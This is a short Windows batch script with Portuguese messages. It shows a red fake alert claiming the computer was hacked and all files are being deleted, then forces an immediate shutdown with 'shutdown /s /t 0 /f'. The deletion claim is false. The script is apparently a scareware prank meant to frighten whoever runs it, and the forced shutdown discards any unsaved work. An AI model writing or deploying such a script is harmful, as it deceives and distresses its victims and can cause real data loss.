@echo off
title ALERTA
color 4f
cls

echo.
echo  ============================================
echo   SEU COMPUTADOR FOI INVASDIDO
echo  ============================================
echo.
echo   Todos os seus arquivos estao sendo
echo   apagados...
echo.
echo   [100%]
echo.
echo   seu sistema sera desligado em 5 segundos.
echo.
echo   não desligue o computador!
echo.

timeout /t 5 /nobreak >nul

shutdown /s /t 0 /f    